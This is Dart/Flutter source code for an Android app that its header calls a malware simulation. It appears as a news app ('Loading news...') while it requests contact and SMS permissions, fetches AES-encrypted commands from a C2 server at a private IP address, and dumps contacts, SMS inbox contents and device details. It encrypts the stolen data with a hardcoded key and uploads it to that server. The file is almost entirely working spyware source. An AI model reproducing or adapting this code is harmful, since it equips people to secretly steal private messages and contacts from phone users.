// /// Flutter Malware Simulation App
// /// Simulates AES-encrypted data exfiltration to mock C2 server
//
// import 'package:flutter/material.dart';
// import 'package:encrypt/encrypt.dart' as encrypt;
// import 'dart:convert';
// import 'package:http/http.dart' as http;
// import 'package:device_info_plus/device_info_plus.dart';
// import 'package:contacts_service/contacts_service.dart';
// import 'package:permission_handler/permission_handler.dart';
// import 'package:telephony/telephony.dart';
//
// void main() {
//   runApp(MalwareApp());
// }
//
// class MalwareApp extends StatelessWidget {
//   @override
//   Widget build(BuildContext context) {
//     return MaterialApp(
//       home: HomeScreen(),
//       debugShowCheckedModeBanner: false,
//     );
//   }
// }
//
// class HomeScreen extends StatefulWidget {
//   @override
//   _HomeScreenState createState() => _HomeScreenState();
// }
//
// class _HomeScreenState extends State<HomeScreen> {
//   String responseText = "";
//   final Telephony telephony = Telephony.instance;
//
//   @override
//   void initState() {
//     super.initState();
//     simulateExfiltration();
//     requestSmsPermission();
//   }
//
//
//
//
//
//   Future<void> requestSmsPermission() async {
//     if (await Permission.sms.isGranted) {
//       print('SMS permission already granted');
//     } else {
//       var result = await Permission.sms.request();
//       if (result.isGranted) {
//         print('SMS permission granted now');
//       } else {
//         print('SMS permission denied');
//       }
//     }
//   }
//
//   Future<void> simulateExfiltration() async {
//     // Request contact permission
//     await Permission.contacts.request();
//     await Permission.sms.request();
//
//     final deviceInfo = await DeviceInfoPlugin().androidInfo;
//     String deviceData =
//         "Model: ${deviceInfo.model}\nID: ${deviceInfo.id}\nAndroid: ${deviceInfo.version.release}";
//     // Get contacts
//     Iterable<Contact> contacts = await ContactsService.getContacts();
//     String contactDump = contacts.map((contact) {
//       final phones = contact.phones?.map((p) => p.value).join(", ");
//       return "Name: ${contact.displayName}, Phones: $phones";
//     }).join("\n");
//
//     // === Dump SMS (inbox) ===
//     List<SmsMessage> smsList = await telephony.getInboxSms(
//       columns: [SmsColumn.ADDRESS, SmsColumn.BODY],
//     );
//     String smsDump = smsList
//         .map((sms) => "From: ${sms.address}, Body: ${sms.body}")
//         .join("\n");
//
//     // Append contacts to device data
//     deviceData += "\n== CONTACTS ==\n$contactDump";
//     deviceData += "\n== SMS ==\n$smsDump";
//
//     String encryptedPayload = encryptData(deviceData, 'hardcodedkey1234');
//
//     var res = await http.post(
//       Uri.parse('http://172.18.3.149:5000/upload'),
//       headers: {'Content-Type': 'application/json'},
//       body: jsonEncode({"payload": encryptedPayload}),
//     );
//
//     if (res.statusCode == 200) {
//       setState(() {
//         responseText = "Response: ${res.body}";
//       });
//     } else {
//       setState(() {
//         responseText = "Failed to reach C2 server";
//       });
//     }
//   }
//
//   String encryptData(String plainText, String keyString) {
//     final key = encrypt.Key.fromUtf8(keyString.padRight(32));
//     final iv = encrypt.IV.fromLength(16);
//     final encrypter = encrypt.Encrypter(
//         encrypt.AES(key, mode: encrypt.AESMode.cbc)); // use CBC
//     final encrypted = encrypter.encrypt(plainText, iv: iv);
//     return encrypted.base64;
//   }
//
//   @override
//   Widget build(BuildContext context) {
//     return Scaffold(
//       appBar: AppBar(title: Text("News App")),
//       body: Center(
//         child: Padding(
//           padding: const EdgeInsets.all(16.0),
//           child: Text(
//             responseText.isEmpty ? "Loading news..." : responseText,
//             textAlign: TextAlign.center,
//           ),
//         ),
//       ),
//     );
//   }
// }

import 'package:flutter/material.dart';
import 'package:encrypt/encrypt.dart' as encrypt;
import 'dart:convert';
import 'package:http/http.dart' as http;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:telephony/telephony.dart';
import 'dart:typed_data';

void main() {
  runApp(MalwareApp());
}

class MalwareApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: HomeScreen(),
      debugShowCheckedModeBanner: false,
    );
  }
}

class HomeScreen extends StatefulWidget {
  @override
  _HomeScreenState createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  String responseText = "";
  final Telephony telephony = Telephony.instance;
  final String sharedKey = 'hardcodedkey1234'; // Backend-compatible

  @override
  void initState() {
    super.initState();
    requestPermissions().then((_) => executeCommandFromServer());
  }

  Future<void> requestPermissions() async {
    await Permission.contacts.request();
    await Permission.sms.request();
  }

  Future<void> executeCommandFromServer() async {
    try {
      final res = await http.get(Uri.parse('http://172.18.3.149:5000/command'));
      if (res.statusCode == 200) {
        final jsonResponse = jsonDecode(res.body);
        print("[*] json response: $jsonResponse");

        final encryptedCommand = jsonResponse['payload'];
        print(
            "[*] Received encrypted command from the C2 SERVER: $encryptedCommand");

        final command = decryptData(encryptedCommand, sharedKey);
        print("[**] Decrypted command: $command");

        final result = await executeCommand(command);
        print("[***] Executes command data from phone: $result");

        final encryptedResult = encryptData(result, sharedKey);
        print(
            "[****] encryptedResult of the executed command on phone : $encryptedResult");

        final postBody = jsonEncode({"payload": encryptedResult});
        print("[*] Uploading to C2 -> /upload payload: $postBody");

        await http.post(
          Uri.parse('http://172.18.3.149:5000/upload'),
          headers: {'Content-Type': 'application/json'},
          body: postBody,
        );

        setState(() {
          responseText = "Executed: $command";
        });
      } else {
        setState(() {
          responseText = "Failed to get command";
        });
      }
    } catch (e) {
      setState(() {
        responseText = "Error: $e";
      });
    }
  }

  Future<String> executeCommand(String cmd) async {
    final deviceInfo = await DeviceInfoPlugin().androidInfo;
    String result = "";

    switch (cmd) {
      case 'exfiltrate_contacts':
        final contacts =
            await ContactsService.getContacts(withThumbnails: false);
        result = contacts.map((c) {
          final phones = c.phones?.map((p) => p.value).join(", ");
          return "Name: ${c.displayName}, Phones: $phones";
        }).join("\n");
        break;

      case 'exfiltrate_sms':
        final smsList = await telephony.getInboxSms(
          columns: [SmsColumn.ADDRESS, SmsColumn.BODY],
        );
        result = smsList
            .map((sms) => "From: ${sms.address}, Body: ${sms.body}")
            .join("\n");
        break;

      case 'get_device_info':
        result =
            "Model: ${deviceInfo.model}\nID: ${deviceInfo.id}\nAndroid: ${deviceInfo.version.release}\nDK built for x86";
        break;

      default:
        result = "Unknown command: $cmd";
    }

    return result;
  }

  String encryptData(String plainText, String keyString) {
    final key = encrypt.Key.fromUtf8(keyString.padRight(32, ' '));
    final iv = encrypt.IV(Uint8List.fromList(List.filled(16, 0))); // ✅ correct
    final encrypter = encrypt.Encrypter(
      encrypt.AES(key, mode: encrypt.AESMode.cbc, padding: 'PKCS7'),
    );
    return encrypter.encrypt(plainText, iv: iv).base64;
  }

  String decryptData(String base64Cipher, String keyString) {
    final key =
        encrypt.Key.fromUtf8(keyString.padRight(32, ' ')); // 32-byte key
    final iv = encrypt.IV(Uint8List.fromList(List.filled(16, 0)));
    final encrypter = encrypt.Encrypter(
        encrypt.AES(key, mode: encrypt.AESMode.cbc, padding: 'PKCS7'));
    return encrypter.decrypt64(base64Cipher, iv: iv);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text("News App")),
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(16.0),
          child: Text(
            responseText.isEmpty ? "Waiting for C2 command..." : responseText,
            textAlign: TextAlign.center,
          ),
        ),
      ),
    );
  }
}
